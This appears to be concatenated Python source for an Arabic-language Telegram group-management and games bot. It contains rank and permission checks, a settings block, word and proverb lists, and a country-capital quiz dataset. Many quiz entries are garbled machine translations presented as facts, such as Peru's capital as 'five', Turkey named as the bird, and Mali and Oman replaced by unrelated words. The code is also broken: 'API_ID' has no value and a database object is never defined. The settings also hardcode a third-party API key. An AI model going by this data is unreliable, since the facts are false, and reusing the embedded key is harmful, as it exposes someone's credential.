# Organized Imports
from PIL import Image
from PIL import Image, ImageFilter
from Python_ARQ import ARQ
from aiohttp import ClientSession
from asyncio import run as RUN
from datetime import datetime
from datetime import datetime, timedelta
from getids import get_date_as_string
from hijri_converter import Hijri, Gregorian
from httpx import HTTPError
from information import *
from io import BytesIO
from io import StringIO
from meval import meval
from mutagen.mp3 import MP3 as mutagenMP3
from pydub import AudioSegment
from pyrogram import *
from pyrogram import Client, filters, idle
from pyrogram.enums import *
from pyrogram.errors import *
from pyrogram.errors import FloodWait
from pyrogram.errors import UserNotParticipant, FloodWait
from pyrogram.file_id import FileId, FileType, ThumbnailSource
from pyrogram.raw.functions.channels import GetFullChannel
from pyrogram.raw.functions.users import GetFullUser
from pyrogram.types import *
from pyrogram.types import Message
from pytio import Tio, TioRequest
from pytube import YouTube
from shazamio import Shazam
from threading import Thread
from threading import Thread as th
from youtube_search import YoutubeSearch as Y88F8
from yt_dlp import YoutubeDL
import asyncio
import cpuinfo
import os
import platform
import psutil
import random
import random, re, pytz
import random, re, time
import random, re, time, json, html, httpx, requests
import random, re, time, os
import random, re, time, os, sys
import random, re, time, os, sys, pytz, string
import random, re, time, pytz
import random, re, time, pytz, os, gtts, requests
import random,re, time, akinator, string
import re
import redis
import redis.asyncio as redis
import requests
import socket
import speech_recognition as sr
import string
import sys
import time, redis, os, json, re, requests, asyncio
import traceback
import urllib.parse
import uuid
import yt_dlp,os, requests, re, time, wget, random, json

# ============================================================
# ============ مركز الإعدادات والمتغيرات الحساسة =============
# ============================================================

# توكن البوت (BOT_TOKEN)
token = ""

# معرف المطور الأساسي (SUDO_ID)
owner_id = 6891530912

# معرف المطور (DEV_ID)
dev_id = 6891530912

# إعدادات API تليجرام
API_ID = 
API_HASH = ""

# إعدادات ARQ API
ARQ_API_KEY = "OZJRWV-SAURXD-PMBUKF-GMVSNS-ARQ"
ARQ_API_URL = "https://arq.hamker.dev"

# المتغيرات المشتقة تلقائياً
if token and ":" in token:
    Dev_Zaid = token.split(':')[0]
    ZAID = Dev_Zaid
else:
    Dev_Zaid = "0"
    ZAID = "0"

# ============================================================

# ==================== FILE: Ranks.py ====================
def get_rank(id, cid) -> str:
   if id == dev_id or id == dev_id:
      return 'Aec🎖️'
   if id == int(Dev_Zaid):
      return 'البوت'
   if id == int(r.get(f'{Dev_Zaid}botowner')):
      return 'Dev🎖️'
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return 'Dev²🎖'
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return 'Myth🎖️'
   if r.get(f'{id}:gban:{Dev_Zaid}'):
      return 'محظور عام'
   if r.get(f'{id}:mute:{Dev_Zaid}'):
      return 'محظور عام'
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankGowner:{Dev_Zaid}'):
         return r.get(f'{cid}:RankGowner:{Dev_Zaid}')
      return 'المالك الاساسي'
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankOwner:{Dev_Zaid}'):
         return r.get(f'{cid}:RankOwner:{Dev_Zaid}')
      return 'المالك'
   if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankMod:{Dev_Zaid}'):
         return r.get(f'{cid}:RankMod:{Dev_Zaid}')
      return 'المدير'
   if r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankAdm:{Dev_Zaid}'):
         return r.get(f'{cid}:RankAdm:{Dev_Zaid}')
      return 'ادمن'
   if r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
      if r.get(f'{cid}:RankPre:{Dev_Zaid}'):
         return r.get(f'{cid}:RankPre:{Dev_Zaid}')
      return 'مميز'
   else:
      if r.get(f'{cid}:RankMem:{Dev_Zaid}'):
         return r.get(f'{cid}:RankMem:{Dev_Zaid}')
      return 'عضو'

def admin_pls(id, cid) -> bool:
   if id == dev_id or id == dev_id:
      return True
   if id == dev_id or id == dev_id:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(r.get(f'{Dev_Zaid}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
      return True
   else:
      return False

def mod_pls(id, cid) -> bool:
   if id == dev_id or id == dev_id:
      return True
   if id == dev_id or id == dev_id:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(r.get(f'{Dev_Zaid}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      return True
   else:
      return False

def owner_pls(id, cid) -> bool:
   if id == dev_id or id == dev_id:
      return True
   if id == dev_id or id == dev_id:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(r.get(f'{Dev_Zaid}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   else:
      return False

def gowner_pls(id, cid) -> bool:
   if id == dev_id or id == dev_id:
      return True
   if id == dev_id or id == dev_id:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(r.get(f'{Dev_Zaid}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   else:
      return False

def dev_pls(id, cid) -> bool:
   if id == dev_id or id == dev_id:
      return True
   if id == dev_id or id == dev_id:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(r.get(f'{Dev_Zaid}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   else:
      return False

def dev2_pls(id, cid) -> bool:
   if id == dev_id or id == dev_id:
      return True
   if id == dev_id or id == dev_id:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(r.get(f'{Dev_Zaid}botowner')):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   else:
      return False

def devp_pls(id, cid) -> bool:
   if id == dev_id or id == dev_id:
      return True
   if id == dev_id or id == dev_id:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(r.get(f'{Dev_Zaid}botowner')):
      return True
   else:
      return False


def pre_pls(id, cid) -> bool:
   if id == dev_id or id == dev_id:
      return True
   if id == dev_id or id == dev_id:
      return True
   if id == int(r.get(f'{Dev_Zaid}botowner')):
      return True
   if id == int(Dev_Zaid):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
      return True
   if r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
      return True
   else:
      return False

   
def get_devs_br():
   list = []
   if not int(r.get(f'{Dev_Zaid}botowner')) == dev_id:
      list.append(dev_id)
   list.append(int(r.get(f'{Dev_Zaid}botowner')))
   if r.smembers(f'{Dev_Zaid}DEV2'):
      for dev2 in r.smembers(f'{Dev_Zaid}DEV2'):
         list.append(int(dev2))
   return list


def isLockCommand(fid: int, cid: int, text: str):
   if not r.hgetall(Dev_Zaid+f"locks-{cid}"):
      return False
   else:
      commands = r.hgetall(Dev_Zaid+f"locks-{cid}")
      if text not in commands: return False
      for command in commands:
         cc = int(commands[command])
         if command.lower() in text.lower():
            print(text)
            print(command)
            if cc == 0:
               if not gowner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 1:
               if not owner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 2:
               if not mod_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 3:
               if not admin_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 4:
               if not pre_pls(fid, cid):
                  return True
               else:
                  return False
# ==================== FILE: games.py ====================
Maths =[
    "200",
    "605",
    "210",
    "128",
    "126",
    "263",
    "150",
    "2000",
    "40",
    "242",
    "14",
    "13",
    "1000",
    "810",
    "110",
    "830",
    "111",
    "92",
    "1100",
    "6800",
    "1554",
    "920",
    "1740",
    "1140",
    "1055",
    "331",
    "162",
    "245",
    "900",
    "791",
    "0",
    "57",
    "220"
]
words =[
    "معلومات",
    "قنوات",
    "مجموعات",
    "كتاب",
    "تفاحه",
    "مختلف",
    "مشكله",
    "مصر",
    "فلوس",
    "اعلم",
    "ذئب",
    "صقر",
    "مختلف",
    "تمساح",
    "ذكي",
    "كلب",
    "سائق",
    "جبل",
    "مفتاح",
    "يساوي",
    "انتبه",
    "انسان",
    "عشق",
    "طلاب",
    "ضفدع",
    "مكتئب",
    "موقد",
    "كمبيوتر",
    "منزل",
    "فنان",
    "صاروخ",
    "اصدقاء",
    "منضده"
]
Arab =[
    "اناث",
    "ثيران",
    "دروس",
    "فحص",
    "رجال",
    "كتب",
    "ضغوط",
    "صف",
    "عصفور",
    "لصوص",
    "تماسيح",
    "ملك",
    "فصل",
    "كلاب",
    "صقور",
    "عقد",
    "بحور",
    "هاتف",
    "حدائق",
    "مسرح",
    "جرائم",
    "مدارس",
    "منزل",
    "كرسي",
    "مناطق",
    "بيوت",
    "بنك",
    "علم",
    "وظائف",
    "طلاب",
    "مراحل",
    "فنانين",
    "صواريخ"
]

gomal = [
        "استمع ' لكثيرين ' وتكلم ' مع ' قليلين",
        "اذا ' كان ' الكلام ' من ' فضة ' فان ' السكوت ' من ' ذهب",
        "يارب ' صبحهم ' بخير ' يا ' شافي ' الاعواق",
        "الذي ' يولد ' وهو ' يزحف ' لا ' يستطيع ' ان ' يطي",
        "عندما ' تعاون ' انسانا ' على ' صعود ' الجبل ' تقترب ' معه ' من ' القمة",
        "رغم ' صعوبة ' الحياة ' الا ' ان ' للحلال ' نكهة ' خاصة",
        "لا ' تمدحن ' امرئ ' حتى ' تجربه ' ولا ' تذمه ' من ' غير ' تجريب",
        "كلنا ' كالقمر ' له ' جانب ' مظلم",
        "فانت ' نبع ' الحنان ' السامي",
        "والحياء ' قد ' غطى ' معالمك",
        "فاصبحنا ' حتى ' نكره ' ان ' نتذكرها ' لكن ' امور ' كثيرة ' تذكرنا ' به",
        "ليس ' العار ' ان ' تسقط ' ولكن ' العار ' ان ' لا ' تستطيع ' النهوض",
        "اخبر ' صديقك ' كذبة ' فان ' كتمها ' اخبره ' الحقيقة",
        "لا ' يجب ' ان ' تقول ' كل ' ما ' تعرف",
        "من ' لم ' يكن ' لسره ' كتوما ' فلا ' يلم ' في ' كشفه ' نديم",
        "صباح ' يحتويه ' الكون ' لانك ' فيه ' انت ' موجود",
        "اذا ' صنت ' المودة ' كان ' باطنها ' احسن ' من ' ظاهره",
        "البذر ' الجيد ' ولو ' سقط ' في ' البحر ' لانبت ' جزيرة",
        "تغادرك ' مساء ' لتاتيك ' صباحا ' وترى ' استقبالك ' لها ' مجدد",
        "اخطر ' انواع ' الوحدة ' يكمن ' في ' انعدام ' الصداقة ' الحقيقية",
        "لا ' تقل ' يا ' رب ' عندي ' هم ' عظيم ' ولكن ' قل ' يا ' هم ' عندي ' رب ' عظيم",
        "لكل ' شيء ' افة ' وافة ' العلم ' نسيانه",
        "الضمير ' المطمئن ' خير ' وسادة ' للراحة",
        "الصداقة ' كالصحة ' لا ' تعرف ' قيمتها ' الا ' اذا ' خسرتها",
        "ان ' حكمة ' اي ' تكليف ' ايماني ' هي ' انه ' صادر ' من ' الله ' سبحانه ' وتعالى"
    ]

trteep = [
    "سحور",
    "سياره",
    "استقبال",
    "قنافه",
    "ايفون",
    "بطاطس",
    "مطبخ",
    "كرستيانو",
    "دجاجه",
    "مدرسه",
    "الوان",
    "غرفه",
    "ثلاجه",
    "قهوه",
    "سفينه",
    "مصر",
    "محطه",
    "طياره",
    "رادار",
    "منزل",
    "مستشفى",
    "كهرباء",
    "تفاحه",
    "اخطبوط",
    "سنترال",
    "فرنسا",
    "برتقاله",
    "تفاح",
    "مطرقه",
    "هريسه",
    "لبانه",
    "شباك",
    "باص",
    "سمكه",
    "ذباب",
    "تلفاز",
    "حاسوب",
    "انترنت",
    "ساحه",
    "جسر"
]
emojis = [
        "🍏",
        "🍎",
        "🍐",
        "🍊",
        "😘",
        "🍉",
        "🍇",
        "🍓",
        "🍈",
        "🍒",
        "🍑",
        "🍍",
        "💋",
        "🥝",
        "🍅",
        "🍆",
        "🥑",
        "🥦",
        "🥒",
        "🌶",
        "🌽",
        "🥕",
        "🥔",
        "🥖",
        "🥐",
        "🍞",
        "🥨",
        "🍟",
        "🧀",
        "🥚",
        "🍳",
        "🥓",
        "🥩",
        "🍗",
        "🍖",
        "🌭",
        "🍔",
        "🍠",
        "🍕",
        "🥪",
        "🥙",
        "☕️",
        "🍵",
        "🥤",
        "🍶",
        "🍺",
        "🍻",
        "🏀",
        "⚽️",
        "🏈",
        "⚾️",
        "🎾",
        "🏐",
        "🏉",
        "🎱",
        "🏓",
        "🏸",
        "🥅",
        "🎰",
        "🎮",
        "🎳",
        "🎯",
        "🎲",
        "🎻",
        "🎸",
        "🎺",
        "🥁",
        "🎹",
        "🎼",
        "🎧",
        "🎤",
        "🎬",
        "🎨",
        "🎭",
        "🎪",
        "🎟",
        "🎫",
        "🎗",
        "🏵",
        "🎖",
        "🏆",
        "🥌",
        "🛷",
        "🚗",
        "🚌",
        "🏎",
        "🚓",
        "🚑",
        "🚚",
        "🚛",
        "🚜",
        "🇮🇶",
        "⚔",
        "🛡",
        "🔮",
        "🌡",
        "💣",
        "📌",
        "📍",
        "📓",
        "📗",
        "📂",
        "📅",
        "📪",
        "📫",
        "📬",
        "📭",
        "⏰",
        "📺",
        "🎚",
        "☎️",
        "📡"
    ]
english =[
    "معلومات",
    "قنوات",
    "مجموعات",
    "كتاب",
    "تفاحه",
    "مختلف",
    "مصر",
    "فلوس",
    "اعلم",
    "ذئب",
    "تمساح",
    "ذكي",
    "كلب",
    "صقر",
    "مشكله",
    "كمبيوتر",
    "اصدقاء",
    "منضده"
]
m3any = [
          "قرد",
          "دجاجه",
          "بطريق",
          "ضفدع",
          "بومه",
          "نحله",
          "ديك",
          "جمل",
          "بقره",
          "دولفين",
          "تمساح",
          "قرش",
          "نمر",
          "اخطبوط",
          "سمكه",
          "خفاش",
          "اسد",
          "فأر",
          "ذئب",
          "فراشه",
          "عقرب",
          "زرافه",
          "قنفذ",
          "تفاحه",
          "باذنجان",
          "قوس قزح",
          "بزازه",
          "بطيخ",
          "وزه",
          "كتكوت"
]
countries = [
        {
            "capital": "براغ",
            "name": "جمهورية التشيك"
        },
        {
            "capital": "برلين",
            "name": "ألمانيا"
        },
        {
            "capital": "جيبوتي",
            "name": "جيبوتي"
        },
        {
            "capital": "كوبنهاغن",
            "name": "الدنمارك"
        },
        {
            "capital": "قصب",
            "name": "دومينيكا"
        },
        {
            "capital": "سانتو دومينغو",
            "name": "جمهورية الدومينيكان"
        },
        {
            "capital": "كيتو",
            "name": "الاكوادور"
        },
        {
            "capital": "تالين",
            "name": "استونيا"
        },
        {
            "capital": "القاهرة",
            "name": "مصر"
        },
        {
            "capital": "رومانسي",
            "name": "اريتريا"
        },
        {
            "capital": "اديس ابابا",
            "name": "أثيوبيا"
        },
        {
            "capital": "هلسنكي",
            "name": "فنلندا"
        },
        {
            "capital": "سوفا",
            "name": "فيجي"
        },
        {
            "capital": "باريس",
            "name": "فرنسا"
        },
        {
            "capital": "ليبرفيل",
            "name": "الجابون"
        },
        {
            "capital": "تبليسي",
            "name": "جورجيا"
        },
        {
            "capital": "أكرا",
            "name": "غانا"
        },
        {
            "capital": "بانجول",
            "name": "غامبيا"
        },
        {
            "capital": "كوناكري",
            "name": "غينيا"
        },
        {
            "capital": "أثينا",
            "name": "اليونان"
        },
        {
            "capital": "غواتيمالا",
            "name": "غواتيمالا"
        },
        {
            "capital": "بورت أو برنس",
            "name": "هايتي"
        },
        {
            "capital": "بيساو",
            "name": "غينيا بيساو"
        },
        {
            "capital": "جورج تاون",
            "name": "غيانا"
        },
        {
            "capital": "تيغوسيغالبا",
            "name": "هندوراس"
        },
        {
            "capital": "بودابست",
            "name": "هنغاريا"
        },
        {
            "capital": "جاكرتا",
            "name": "اندونيسيا"
        },
        {
            "capital": "دبلن",
            "name": "جمهورية ايرلندا"
        },
        {
            "capital": "القدس",
            "name": "فلسطين"
        },
        {
            "capital": "نيو دلهي",
            "name": "الهند"
        },
        {
            "capital": "بغداد",
            "name": "العراق"
        },
        {
            "capital": "طهران",
            "name": "ايران"
        },
        {
            "capital": "ReykjavÃ­k",
            "name": "أيسلندا"
        },
        {
            "capital": "روما",
            "name": "ايطاليا"
        },
        {
            "capital": "كينغستون",
            "name": "جامايكا"
        },
        {
            "capital": "عمان",
            "name": "الأردن"
        },
        {
            "capital": "طوكيو",
            "name": "اليابان"
        },
        {
            "capital": "نيروبي",
            "name": "كينيا"
        },
        {
            "capital": "بيشكيك",
            "name": "قيرغيزستان"
        },
        {
            "capital": "مجموعة",
            "name": "كيريباتي"
        },
        {
            "capital": "بيونغ يانغ",
            "name": "كوريا الشمالية"
        },
        {
            "capital": "سيول",
            "name": "كوريا الجنوبية"
        },
        {
            "capital": "الكويت",
            "name": "الكويت"
        },
        {
            "capital": "بيروت",
            "name": "لبنان"
        },
        {
            "capital": "فادوز",
            "name": "ليختنشتاين"
        },
        {
            "capital": "مونروفيا",
            "name": "ليبيريا"
        },
        {
            "capital": "ماسيرو",
            "name": "ليسوتو"
        },
        {
            "capital": "فيلنيوس",
            "name": "ليتوانيا"
        },
        {
            "capital": "لوكسمبورغ",
            "name": "لوكسمبورغ"
        },
        {
            "capital": "سبق",
            "name": "لاتفيا"
        },
        {
            "capital": "طرابلس",
            "name": "ليبيا"
        },
        {
            "capital": "أنتاناناريفو",
            "name": "مدغشقر"
        },
        {
            "capital": "ماجورو",
            "name": "جزر مارشال"
        },
        {
            "capital": "سكوبي",
            "name": "مقدونيا"
        },
        {
            "capital": "باماكو",
            "name": "كان لديهم"
        },
        {
            "capital": "نايبيداو",
            "name": "ميانمار"
        },
        {
            "capital": "أولان باتور",
            "name": "منغوليا"
        },
        {
            "capital": "نواكشوط",
            "name": "موريتانيا"
        },
        {
            "capital": "فاليتا",
            "name": "مالطا"
        },
        {
            "capital": "بورت لويس",
            "name": "موريشيوس"
        },
        {
            "capital": "ذكر",
            "name": "جزر المالديف"
        },
        {
            "capital": "ليلونغوي",
            "name": "ملاوي"
        },
        {
            "capital": "مكسيكو سيتي",
            "name": "المكسيك"
        },
        {
            "capital": "كوالا لمبور",
            "name": "ماليزيا"
        },
        {
            "capital": "مابوتو",
            "name": "موزمبيق"
        },
        {
            "capital": "ويندهوك",
            "name": "ناميبيا"
        },
        {
            "capital": "نيامي",
            "name": "النيجر"
        },
        {
            "capital": "أبوجا",
            "name": "نيجيريا"
        },
        {
            "capital": "ماناغوا",
            "name": "نيكاراغوا"
        },
        {
            "capital": "أمستردام",
            "name": "مملكة هولندا"
        },
        {
            "capital": "أوسلو",
            "name": "النرويج"
        },
        {
            "capital": "كاتماندو",
            "name": "نيبال"
        },
        {
            "capital": "اللغة",
            "name": "ناورو"
        },
        {
            "capital": "ويلينجتون",
            "name": "نيوزيلاندا"
        },
        {
            "capital": "مسقط",
            "name": "خاصتي"
        },
        {
            "capital": "باناما",
            "name": "بنما"
        },
        {
            "capital": "خمسة",
            "name": "بيرو"
        },
        {
            "capital": "مرفئ مويسبي",
            "name": "بابوا غينيا الجديدة"
        },
        {
            "capital": "مانيلا",
            "name": "فيلبيني"
        },
        {
            "capital": "اسلام آباد",
            "name": "باكستان"
        },
        {
            "capital": "وارسو",
            "name": "بولندا"
        },
        {
            "capital": "لشبونة",
            "name": "البرتغال"
        },
        {
            "capital": "Ngerulmud",
            "name": "بالاو"
        },
        {
            "capital": "أسونسيون",
            "name": "باراغواي"
        },
        {
            "capital": "الدوحة",
            "name": "قطر"
        },
        {
            "capital": "بوخارست",
            "name": "رومانيا"
        },
        {
            "capital": "موسكو",
            "name": "روسيا"
        },
        {
            "capital": "كيغالي",
            "name": "رواندا"
        },
        {
            "capital": "الرياض",
            "name": "المملكة العربية السعودية"
        },
        {
            "capital": "هونيارا",
            "name": "جزر سليمان"
        },
        {
            "capital": "فيكتوريا",
            "name": "سيشيل"
        },
        {
            "capital": "خرطوم",
            "name": "السودان"
        },
        {
            "capital": "ستوكهولم",
            "name": "السويد"
        },
        {
            "capital": "سنغافورة",
            "name": "سنغافورة"
        },
        {
            "capital": "ليوبليانا",
            "name": "سلوفينيا"
        },
        {
            "capital": "براتيسلافا",
            "name": "سلوفاكيا"
        },
        {
            "capital": "فريتاون",
            "name": "سيرا ليون"
        },
        {
            "capital": "سان مارينو",
            "name": "سان مارينو"
        },
        {
            "capital": "داكار",
            "name": "السنغال"
        },
        {
            "capital": "مقديشو",
            "name": "الصومال"
        },
        {
            "capital": "باراماريبو",
            "name": "سورينام"
        },
        {
            "capital": "ساو تومي",
            "name": "SAO TOME © و PRINCIPE"
        },
        {
            "capital": "دمشق",
            "name": "سوريا"
        },
        {
            "capital": "لومي",
            "name": "توجو"
        },
        {
            "capital": "بانكوك",
            "name": "تايلاند"
        },
        {
            "capital": "الاثنين",
            "name": "طاجيكستان"
        },
        {
            "capital": "عشق أباد",
            "name": "تركمانستان"
        },
        {
            "capital": "تونس",
            "name": "تونس"
        },
        {
            "capital": "نوكو »ألوفا",
            "name": "وصل"
        },
        {
            "capital": "أنقرة",
            "name": "ديك رومى"
        },
        {
            "capital": "ميناء اسبانيا",
            "name": "ترينداد وتوباغو"
        },
        {
            "capital": "يقاتل",
            "name": "توفالو"
        },
        {
            "capital": "دودوما",
            "name": "تنزانيا"
        },
        {
            "capital": "كييف",
            "name": "أوكرانيا"
        },
        {
            "capital": "كمبالا",
            "name": "أوغندا"
        },
        {
            "capital": "واشنطن.",
            "name": "الولايات المتحدة"
        },
        {
            "capital": "مونتيفيديو",
            "name": "أوروغواي"
        },
        {
            "capital": "طشقند",
            "name": "أوزبكستان"
        },
        {
            "capital": "الفاتيكان",
            "name": "الفاتيكان"
        },
        {
            "capital": "كاراكاس",
            "name": "فنزويلا"
        },
        {
            "capital": "هانوي",
            "name": "فيتنام"
        },
        {
            "capital": "بورت فيلا",
            "name": "فانواتو"
        },
        {
            "capital": "صنعاء",
            "name": "اليمن"
        },
        {
            "capital": "لوساكا",
            "name": "زامبيا"
        },
        {
            "capital": "هراري",
            "name": "زيمبابوي"
        },
        {
            "capital": "الجزائر",
            "name": "الجزائر"
        },
        {
            "capital": "سراييفو",
            "name": "البوسنة والهرسك"
        },
        {
            "capital": "بنوم بنه",
            "name": "كمبوديا"
        },
        {
            "capital": "بانغي",
            "name": "جمهورية افريقيا الوسطى"
        },
        {
            "capital": "ناضجمنا",
            "name": "تشاد"
        },
        {
            "capital": "موروني",
            "name": "جزر القمر"
        },
        {
            "capital": "زغرب",
            "name": "كرواتيا"
        },
        {
            "capital": "ليس",
            "name": "تيمور الشرقية"
        },
        {
            "capital": "سان سلفادور",
            "name": "السلفادور"
        },
        {
            "capital": "ضبابية",
            "name": "غينيا الاستوائية"
        },
        {
            "capital": "سانت جورج",
            "name": "غرينادا"
        },
        {
            "capital": "أستانا",
            "name": "كازاخستان"
        },
        {
            "capital": "فينتيان",
            "name": "لاوس"
        },
        {
            "capital": "غادر",
            "name": "ولايات ميكرونيزيا الموحدة"
        },
        {
            "capital": "موناكو",
            "name": "موناكو"
        },
        {
            "capital": "بودغوريتشا",
            "name": "الجبل الأسود"
        },
        {
            "capital": "الرباط",
            "name": "المغرب"
        },
        {
            "capital": "باستير",
            "name": "سانت كيتس ونيفيس"
        },
        {
            "capital": "كاستريس",
            "name": "القديسة لوسيا"
        },
        {
            "capital": "كينغستاون",
            "name": "سانت فنسنت وجزر غرينادين"
        },
        {
            "capital": "أبيا",
            "name": "ساموا"
        },
        {
            "capital": "بلغراد",
            "name": "صربيا"
        },
        {
            "capital": "بريتوريا",
            "name": "جنوب أفريقيا"
        },
        {
            "capital": "مدريد",
            "name": "اسبانيا"
        },
        {
            "capital": "سري جياردينبورا كوتي",
            "name": "سيريلانكا"
        },
        {
            "capital": "مبابان",
            "name": "سوازيلاند"
        },
        {
            "capital": "برن",
            "name": "سويسرا"
        },
        {
            "capital": "ابو ظبي",
            "name": "الامارات العربية المتحدة"
        },
        {
            "capital": "لندن",
            "name": "المملكة المتحدة"
        }
]
mthal = [
          "اخوات",
          "زيهم",
          "الزبيب",
          "داره",
          "الوالدين",
          "شمعتك",
          "مرايه",
          "الرءوس",
          "حدو",
          "رجالها",
          "عدوك",
          "الغراب",
          "الغطاس",
          "ماتو",
          "اتمكن",
          "زجاج",
          "فار",
          "شهر",
          "القتيل",
          "يكحله",
          "امه"
]
countries_ = [
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Afghanistan.png",
            "name": "افغانستان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Albania.png",
            "name": "البانيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Algeria.png",
            "name": "الجزائر"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Andorra.png",
            "name": "اندورا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Angola.png",
            "name": "انغولا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Antigua.png",
            "name": "انتيغوا وبربودا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Argentina.png",
            "name": "الارجنتين"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Armenia.png",
            "name": "ارمينيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Australia.png",
            "name": "استراليا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Austria.png",
            "name": "النمسا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Azerbaijan.png",
            "name": "اذربيجان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Bahamas.png",
            "name": "جزر البهاما"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Bahrain.png",
            "name": "البحرين"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Bangladesh.png",
            "name": "بنغلاديش"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Barbados.png",
            "name": "بربادوس"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Belarus.png",
            "name": "بيلاروسيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Belgium.png",
            "name": "بلجيكا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Belize.png",
            "name": "بليز"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Benin.png",
            "name": "بنين"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Bhutan.png",
            "name": "بوتان"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Bolivia.png",
            "name": "بوليفيا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Bosnia-Herzegovina.png",
            "name": "البوسنة والهرسك"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Botswana.png",
            "name": "بوتسوانا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Brazil.png",
            "name": "البرازيل"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Brunei.png",
            "name": "بروناي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Bulgaria.png",
            "name": "بلغاريا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Burkina-Faso.png",
            "name": "بوركينا فاسو"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Burundi.png",
            "name": "بوروندي"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Cabo-Verde.png",
            "name": "الراس الاخضر"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Cambodia.png",
            "name": "كمبوديا"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Cameroon.png",
            "name": "الكاميرون"
        },
        {
            "flag": "https://www.countries-ofthe-world.com/flags-normal/flag-of-Canada.png",
            "name": "كندا"
        },
        {
